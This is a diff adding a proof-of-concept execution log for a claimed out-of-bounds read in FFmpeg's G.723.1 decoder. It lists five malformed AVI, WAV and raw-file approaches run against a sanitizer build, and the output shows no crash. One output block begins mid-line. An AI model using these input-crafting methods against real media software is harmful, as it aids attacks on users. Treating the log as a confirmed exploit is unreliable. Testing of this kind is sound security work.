@@ -1,0 +1,171 @@
+=== VULN 001 PoC: g723_1_decode_frame() OOB Read ===
+Bug: buf[0] accessed at line 933 before size check at line 943
+
+[*] Generating input files...
+Created /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_g723_1dec_c/vuln_001_input.avi (210 bytes)
+Created /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_g723_1dec_c/vuln_001_input.g723_1 (1 byte, dec_mode=3)
+Created /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_g723_1dec_c/vuln_001_input.wav (46 bytes)
+Done.
+
+=== Approach 1: AVI file with zero-size G.723.1 audio chunk ===
+[*] Running: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -i vuln_001_input.avi -f null -
+
+=== Approach 2: raw g723_1 file (1 byte, dec_mode=3, frame_size=1) ===
+[*] Running: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f g723_1 -i vuln_001_input.g723_1 -f null -
+
+=== Approach 3: WAV file with zero-size G.723.1 data chunk ===
+[*] Running: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -i vuln_001_input.wav -f null -
+
+=== Approach 4: raw g723_1 with 0-byte file ===
+[*] Creating 0-byte g723_1 input and running...
+
+=== Approach 5: AVI file with too-small G.723.1 audio chunk (3 bytes, dec_mode=0) ===
+Created vuln_001_input_short.avi (213 bytes)
+[*] Running: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -i vuln_001_input_short.avi -f null -
+
+=== PoC execution complete ===
+ns --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[aist#0:0/g723_1 @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, avi, from 'vuln_001_input.avi':
+  Duration: 00:00:00.00, start: 0.000000, bitrate: 13440 kb/s
+  Stream #0:0: Audio: g723_1 (B[0][0][0] / 0x0042), 8000 Hz, mono, s16p, 6 kb/s
+Stream mapping:
+  Stream #0:0 -> #0:0 (g723_1 (native) -> pcm_s16le (native))
+Press [q] to stop, [?] for help
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 8000 Hz, mono, s16, 128 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000cc0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000cc0] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.01    
+
+=== Approach 2: raw g723_1 file (1 byte, dec_mode=3, frame_size=1) ===
+[*] Running: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f g723_1 -i vuln_001_input.g723_1 -f null -
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, g723_1, from 'vuln_001_input.g723_1':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Audio: g723_1, 8000 Hz, mono, s16p
+Stream mapping:
+  Stream #0:0 -> #0:0 (g723_1 (native) -> pcm_s16le (native))
+Press [q] to stop, [?] for help
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 8000 Hz, mono, s16, 128 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000cc0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+size=N/A time=00:00:00.03 bitrate=N/A speed=2.51x elapsed=0:00:00.01    
+
+=== Approach 3: WAV file with zero-size G.723.1 data chunk ===
+[*] Running: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -i vuln_001_input.wav -f null -
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[in#0 @ 0x517000000080] Ignoring maximum wav data size, file may be invalid
+[aist#0:0/g723_1 @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, wav, from 'vuln_001_input.wav':
+  Duration: N/A, bitrate: 6 kb/s
+  Stream #0:0: Audio: g723_1 (B[0][0][0] / 0x0042), 8000 Hz, mono, s16p, 6 kb/s
+Stream mapping:
+  Stream #0:0 -> #0:0 (g723_1 (native) -> pcm_s16le (native))
+Press [q] to stop, [?] for help
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 8000 Hz, mono, s16, 128 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000cc0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000cc0] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.01    
+
+=== Approach 4: raw g723_1 with 0-byte file ===
+[*] Creating 0-byte g723_1 input and running...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, g723_1, from 'vuln_001_input_empty.g723_1':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Audio: g723_1, 8000 Hz, mono, s16p
+Stream mapping:
+  Stream #0:0 -> #0:0 (g723_1 (native) -> pcm_s16le (native))
+Press [q] to stop, [?] for help
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 8000 Hz, mono, s16, 128 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000cc0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000cc0] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.01    
+
+=== Approach 5: AVI file with too-small G.723.1 audio chunk (3 bytes, dec_mode=0) ===
+[*] Running: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -i vuln_001_input_short.avi -f null -
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[aist#0:0/g723_1 @ 0x514000000240] Guessed Channel Layout: mono
+Input #0, avi, from 'vuln_001_input_short.avi':
+  Duration: 00:00:00.00, start: 0.000000, bitrate: 13632 kb/s
+  Stream #0:0: Audio: g723_1 (B[0][0][0] / 0x0042), 8000 Hz, mono, s16p, 6 kb/s
+Stream mapping:
+  Stream #0:0 -> #0:0 (g723_1 (native) -> pcm_s16le (native))
+Press [q] to stop, [?] for help
+[af#0:0 @ 0x516000000080] No filtered frames for output stream, trying to initialize anyway.
+Output #0, null, to 'pipe:':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0: Audio: pcm_s16le, 8000 Hz, mono, s16, 128 kb/s
+    Metadata:
+      encoder         : Lavc63.11.100 pcm_s16le
+[out#0/null @ 0x511000000cc0] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/null @ 0x511000000cc0] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=N/A time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.01    
+
+=== PoC execution complete ===
+EXIT=0
